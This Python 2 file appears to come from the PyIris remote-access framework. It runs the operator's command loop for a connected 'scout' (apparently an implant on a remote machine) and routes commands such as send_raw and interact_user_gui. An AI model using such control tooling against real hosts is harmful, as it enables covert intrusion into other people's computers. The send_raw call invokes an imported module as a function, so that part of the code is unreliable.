import time
import library.commands.global_interface.clear as clear
import library.commands.global_interface.quit as quit
import library.commands.global_interface.python as python
import library.commands.global_interface.local as local
import library.commands.global_interface.help as help
import library.commands.direct_interface.send_raw as send_raw
import library.commands.direct_interface.interact_user_gui as IUG
import library.modules.config as config

config.main()

def main(scout_id):
    try:
        scout_id = scout_id.split(' ',1)[1]
        scout_prompt = config.scout_database[scout_id][1] + ':' + config.scout_database[scout_id][2]
        print '[+]Bridged to : ' + scout_id
    except (IndexError, KeyError):
        print '[-]Please enter a valid scout ID'
        return
    while True:
        try:
            prompt = raw_input('PyIris (Scout@' + scout_prompt + ') > ').strip()
            command = prompt.split(' ',1)[0]
            if command == 'back':
                print '[*]Returning to scout interface...'
                return
            elif command == 'clear':
                clear.main()
            elif command in ('?','help'):
                help.main('direct',prompt)
            elif command in ('!' ,'local'):
                local.main(prompt)
            elif command == 'main':
                print '[*]Returning to scout interface...'
                return 'home'
            elif command == 'python':
                python.main()
            elif command == 'quit':
                quit.main()
            elif command == 'send_raw':
                send_raw(scout_id,prompt)
            elif command == 'interact_user_gui':
                IUG.main(scout_id)
            elif not command:
                pass
            else:
                print '[-]Invalid command, run "help" for help menu'
        except EOFError:
            try:
                time.sleep(2)
            except KeyboardInterrupt:
                quit.main()
        except KeyboardInterrupt:
            quit.main()